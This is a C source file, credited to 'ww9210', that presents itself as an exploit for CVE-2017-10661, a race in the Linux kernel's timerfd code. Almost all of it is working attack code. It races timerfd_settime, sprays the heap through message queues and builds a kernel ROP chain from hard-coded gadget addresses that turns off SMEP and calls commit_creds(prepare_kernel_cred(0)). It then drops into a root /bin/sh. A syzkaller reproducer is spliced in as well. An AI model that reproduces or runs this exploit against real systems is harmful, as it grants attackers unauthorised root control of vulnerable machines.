// author ww9210
// exploit for cve-2017-10661
long r[49];
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#define SPRAY_BUF_SIZE 191
char spray_buffer[192];
void spray_buffer_init(){
    *(unsigned long*)(spray_buffer + 0x60)=0xfacea100;
    *(unsigned long*)(spray_buffer + 0xa0)=0x1;
}

#include <stdio.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <errno.h>
#define SPRAY_PROCESS 16
#define STRUCT_LEN 192
#define CRASH_ADDR 0xffffffffdeadbeef

#define NUM_MSG 16
/* heap spray */

struct msgbuf
{
	long mtype;
	char mtext[STRUCT_LEN];
};

struct msgbuf msg={0x4141414141414141,{0}};
int msqid;

int msgsnd_spray()
{
	int i;
	unsigned long int *ptr;
	if ((msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT)) == -1)
	{
		perror("msgget");
		exit(1);
	}
	memcpy(msg.mtext, spray_buffer, STRUCT_LEN-1);
	for( i = 0; i < NUM_MSG; i++)
	{
		if (msgsnd(msqid, &msg, sizeof(msg.mtext), 0) == -1)
		{
			perror("msgsnd");
			exit(1);
		}
	}
}

int msgrcv_spray()
{
	struct msgbuf msg_rcv;
	int i;
	for(i = 0; i < NUM_MSG; i++)
	{
		if (msgrcv(msqid, (void *) &msg_rcv, sizeof(msg_rcv.mtext), 0,
					MSG_NOERROR | IPC_NOWAIT) == -1)
		{
			if(errno != ENOMSG)
			{
				perror("msgrcv");
				exit(EXIT_FAILURE);
			}
		}
		else
		{
			//printf("message received: %s\n", msg.mtext);
		}
	}
	return 0;
}

void do_fork_msgsnd_spray()
{
	int i;
	pid_t pid;

	msgsnd_spray();
	for(i = 0;i<SPRAY_PROCESS;i++)
	{
		pid = clean_fork();
		if (pid == -1)
		{
			perror("fork");
			exit(0);
		}
		if (pid == 0)
		{
			msgsnd_spray();
			pause();
			//exit(0);
		}
	}
}

#include <sys/mman.h>
#define native_write_cr4 0xffffffff810489c0
#define PREPARE_KERNEL_CRED 0xffffffff8107aed0
#define COMMIT_CREDS 0xffffffff8107ab40
#define poprdiret 0xffffffff810eed4d
#define swapgs 0xffffffff81048a84
#define iretq 0xffffffff81021d86
#define stack_pivot_gadget 0xffffffff816d8e68
#define stack_top_offset 0x0
#define krop_base_to_map 0x816d8000
#define stack_adjust 0xffffffff81004510// pop rbx ; pop rbp ; ret
int rop_start=0xe68;
void* krop_base_mapped;

unsigned long user_cs, user_ss, user_rflags;

static void save_state()
{
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "pushfq\n"
        "popq %2\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags)
        :
        : "memory");
}

void get_shell()
{
    char *shell = "/bin/sh";
    char *args[] = {shell, NULL};
    execve(shell, args, NULL);
}

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);

_commit_creds commit_creds = (_commit_creds)COMMIT_CREDS;
_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED;

void get_root_payload(void)
{
    commit_creds(prepare_kernel_cred(0));
}
unsigned long rop_chain[] = {
    stack_adjust,
    0,
    0,
    poprdiret,
    0x6f0,
    native_write_cr4,
    get_root_payload,
    swapgs,
    0, //dummy
    iretq,
    get_shell,
    0,//user_cs,
    0,//user_rflags,
    0,//krop_base_mapped + 0x4000,
    0//user_ss
};

void prepare_krop(){
    krop_base_mapped=mmap((void *)krop_base_to_map,0x8000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
    if (krop_base_mapped<0){
        perror("mmap failed");
    }
    rop_chain[11]=user_cs;
    rop_chain[12]=user_rflags;
    rop_chain[13]=krop_base_mapped + 0x4000;
    rop_chain[14]=user_ss;
    memcpy(krop_base_mapped+rop_start,rop_chain,sizeof(rop_chain));
    puts("rop_payload_initialized");
}


#define userspace_base_to_map 0xfacea000

void * userspace_base;
void mmap_userspace_base(){
    userspace_base = mmap((void *)userspace_base_to_map-0x1000,0x1000 * 2,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
    if (userspace_base_to_map<0){
        perror("mmap failed");
    }
}

void init_userspace_base(){
    mmap_userspace_base();
    memcpy(userspace_base_to_map+0xe8, rop_chain, sizeof(rop_chain));
    *(unsigned long*)(userspace_base_to_map + 0xf8)=CRASH_ADDR;
}

// autogenerated by syzkaller (http://github.com/google/syzkaller)

#define _GNU_SOURCE

#include <sys/syscall.h>
#include <unistd.h>

#include <stdint.h>
#include <string.h>

long r[49];
void loop()
{
  r[27] = syscall(__NR_clock_adjtime, 0x0ul, 0x20213f30ul);
  return;
  memcpy((void*)0x20378000,
         "\x69\x64\x5f\x72\x65\x73\x6f\x6c\x76\x65\x72\x00", 12);
  *(uint8_t*)0x20e25000 = (uint8_t)0x73;
  *(uint8_t*)0x20e25001 = (uint8_t)0x79;
  *(uint8_t*)0x20e25002 = (uint8_t)0x7a;
  *(uint8_t*)0x20e25003 = (uint8_t)0x20;
  *(uint8_t*)0x20e25004 = (uint8_t)0x0;
  memcpy((void*)0x20e25000, "\xae\xdf\x5a\xd3", 4);
  r[35] = syscall(__NR_add_key, 0x20378000ul, 0x20e25000ul,
                  0x20e25000ul, 0x4ul, 0xfffffffffffffffbul);
  r[36] = syscall(__NR_socket, 0x2ul, 0x6ul, 0x0ul);
  memcpy((void*)0x20e26ff8, "\x2e\x2f\x66\x69\x6c\x65\x30\x00", 8);
  r[38] = syscall(__NR_openat, 0xffffffffffffff9cul, 0x20e26ff8ul,
                  0x3ul, 0x40ul);
  *(uint32_t*)0x207ebfe7 = (uint32_t)0x0;
  *(uint32_t*)0x207ebfeb = (uint32_t)0x11;
  memcpy((void*)0x207ebfef, "\x28\x31\x9b\xc9\x4e\x00\x00\x22\x2f\x41"
                            "\x8f\x65\x3a\x0c\x59\x7a\xae",
         17);
  *(uint32_t*)0x20070ffc = (uint32_t)0x19;
  r[43] = syscall(__NR_getsockopt, 0xffffffffffffff9cul, 0x84ul, 0x1aul,
                  0x207ebfe7ul, 0x20070ffcul);
  if (r[43] != -1)
    r[44] = *(uint32_t*)0x207ebfe7;
  *(uint32_t*)0x201cfff4 = r[44];
  *(uint32_t*)0x201cfff8 = (uint32_t)0x100;
  *(uint16_t*)0x201cfffc = (uint16_t)0x30;
  r[48] = syscall(__NR_setsockopt, r[38], 0x84ul, 0x72ul, 0x201cfff4ul,
                  0xcul);
}
/*
int main()
{
  loop();
  return 0;
}
*/

#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <sys/timerfd.h>
#include <sys/time.h>
#include <sys/msg.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <time.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <pthread.h>
#define RACE_TIME 8000
#define NUM_THREADS 2

int fd;
int fd_dumb;

struct detect_profile{
    unsigned long* ptr;
    int profile_type;
};

void* list_add_thread(void* arg){

    int ret;

    struct itimerspec new_t ={
        .it_interval={
            .tv_sec=100,
            .tv_nsec=100
        },
        .it_value={
            .tv_sec=100,
            .tv_nsec=100
        }
    };

    int i=0;
    while(i<1){

        ret=timerfd_settime(fd,3,&new_t,NULL);

        if(ret<0){
            perror("timerfd settime failed !");
        }
        i++;
    }


    return NULL;
}

void* list_del_thread(void* arg){

    int ret;

    struct itimerspec new_t ={
        .it_interval={
            .tv_sec=100,
            .tv_nsec=100
        },
        .it_value={
            .tv_sec=100,
            .tv_nsec=100
        }
    };

    int i=0;
    while(i<1){
        ret=timerfd_settime(fd,1,&new_t,NULL);

        if(ret<0){
            perror("timerfd settime failed !");
        }
        i++;
    }
    return NULL;

}

int do_race(){
    int ret_add[NUM_THREADS];
    int i;
    int j;
    pthread_t th[NUM_THREADS]={0};
	memset(ret_add,0,8);

    i=0;
    while(i < RACE_TIME){
		printf("race_time: %d\n", i);

        fd=timerfd_create(CLOCK_REALTIME,0);
        if(fd<0){
            perror("timerfd craete failed!");
            return -1;
        }
        for(j=0;j<NUM_THREADS;j++){
            ret_add[j]=pthread_create(&th[j],NULL,list_add_thread,(void*)2);
        }

        for( j=0;j<NUM_THREADS;j++){
            pthread_join(th[j],NULL);
        }

        close(fd);
        usleep(300000);
        msgsnd_spray();
        msgrcv_spray();
        loop();
        i++;
        *(unsigned long*)(userspace_base_to_map + 0)=0;
        *(unsigned long*)(userspace_base_to_map - 8)=0;
        *(unsigned long*)(krop_base_mapped + 0)=0;
        *(unsigned long*)(krop_base_mapped + 0x4000)=0;
        *(unsigned long*)(krop_base_mapped + 0x4000 - 8)=0;
    }

    return 0;
}

int main_10661()
{
    int ret;
    save_state();
    spray_buffer_init();
    prepare_krop();
    init_userspace_base();

    struct itimerspec new_t ={
        .it_interval={
            .tv_sec=100,
            .tv_nsec=100
        },
        .it_value={
            .tv_sec=100,
            .tv_nsec=100
        }
    };
    fd_dumb = timerfd_create(CLOCK_REALTIME,0);

    ret = timerfd_settime(fd_dumb,3,&new_t,NULL);
    if(ret < 0){
        perror("timerfd settime failed !");
    }

    ret=do_race();
    if(ret <0){
        puts("race failed!");
        goto error_end;
    }

    sleep(5);
error_end:
	return 0;
}


int main()
{
  r[0] = syscall(__NR_mmap, 0x20000000ul, 0xe26000ul, 0x3ul, 0x32ul,
                 0xfffffffffffffffful, 0x0ul);
  *(uint64_t*)0x20213f30 = (uint64_t)0x101;
  *(uint64_t*)0x20213f38 = (uint64_t)0xfffffffffffffffc;
  *(uint64_t*)0x20213f40 = (uint64_t)0x5;
  *(uint64_t*)0x20213f48 = (uint64_t)0x9;
  *(uint64_t*)0x20213f50 = (uint64_t)0xffffffffffff0000;
  *(uint64_t*)0x20213f58 = (uint64_t)0xffff;
  *(uint64_t*)0x20213f60 = (uint64_t)0x9;
  *(uint64_t*)0x20213f68 = (uint64_t)0x0;
  *(uint64_t*)0x20213f70 = (uint64_t)0x1;
  *(uint64_t*)0x20213f78 = (uint64_t)0xff;
  *(uint64_t*)0x20213f80 = (uint64_t)0x7;
  *(uint64_t*)0x20213f88 = (uint64_t)0x2;
  *(uint64_t*)0x20213f90 = (uint64_t)0x800;
  *(uint64_t*)0x20213f98 = (uint64_t)0xfff;
  *(uint64_t*)0x20213fa0 = (uint64_t)0x101;
  *(uint64_t*)0x20213fa8 = (uint64_t)0x100;
  *(uint64_t*)0x20213fb0 = (uint64_t)0x3;
  *(uint64_t*)0x20213fb8 = (uint64_t)0x7;
  *(uint64_t*)0x20213fc0 = (uint64_t)0x100000000;
  *(uint64_t*)0x20213fc8 = (uint64_t)0x101;
  *(uint64_t*)0x20213fd0 = (uint64_t)0x3f;
  *(uint64_t*)0x20213fd8 = (uint64_t)0x40;
  *(uint64_t*)0x20213fe0 = (uint64_t)0x2;
  *(uint64_t*)0x20213fe8 = (uint64_t)0x6;
  *(uint64_t*)0x20213ff0 = (uint64_t)0x8001;
  *(uint64_t*)0x20213ff8 = (uint64_t)0x1;
  main_10661();
  return 0;
}
